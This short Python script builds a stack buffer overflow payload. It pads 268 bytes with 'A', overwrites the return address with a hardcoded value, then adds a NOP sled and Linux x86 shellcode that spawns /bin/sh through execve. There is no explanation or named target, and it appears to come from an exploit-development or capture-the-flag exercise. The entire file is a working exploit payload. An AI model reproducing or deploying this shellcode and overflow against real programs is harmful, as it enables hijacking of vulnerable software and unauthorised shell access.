import struct

shell_code = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

padding = ""
padding += "A" * 268
padding += struct.pack("<L",0xf7dd4ff7) 
padding += "\x90" * 10
padding += shell_code